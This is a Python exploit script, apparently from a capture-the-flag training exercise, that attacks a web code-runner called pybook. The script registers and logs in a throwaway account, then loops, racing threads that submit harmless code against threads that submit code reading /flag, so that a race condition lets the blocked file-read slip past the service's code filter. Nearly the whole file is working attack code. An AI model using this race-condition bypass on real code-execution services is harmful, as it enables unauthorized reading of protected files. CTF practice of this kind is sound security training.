#!/usr/bin/env python3

import random
import string
import requests
import threading

URL = "http://pybook.training.jinblack.it"
found = False


def register(session, username, password):
    url = "%s/register" % URL
    payload = {"username": username, "password": password}
    r = session.post(url, data=payload)
    return r.text


def login(session, username, password):
    url = "%s/login" % URL
    payload = {"username": username, "password": password}
    r = session.post(url, data=payload)
    return r.text


def run(session, code):
    global found
    url = "%s/run" % URL
    payload = code
    r = session.post(url, data=payload)
    if "flag{" in r.text:
        print(r.text)
        found = True
    return r.text


def random_string():
    k = random.randint(6, 10)
    return "".join(random.choices(string.ascii_lowercase, k=k))


username = random_string()
password = random_string()
session = requests.Session()

res = register(session, username, password)
assert "Registration completed!" in res

res = login(session, username, password)
assert "Welcome back!" in res

good_code = "print('this should work')\n" * 1000

res = run(session, good_code)
assert "this should work" in res

malicious_code = """
file = open("/flag", "r")
print(file.read())
file.close()
"""

res = run(session, malicious_code)
assert "Unallowd Code!" in res

while not found:
    print(".")
    t_good_run = threading.Thread(target=run, args=(
        session, good_code))
    t_good_run.start()

    t_malicious_run = threading.Thread(target=run, args=(
        session, malicious_code))
    t_malicious_run.start()

    t_malicious_run.join()
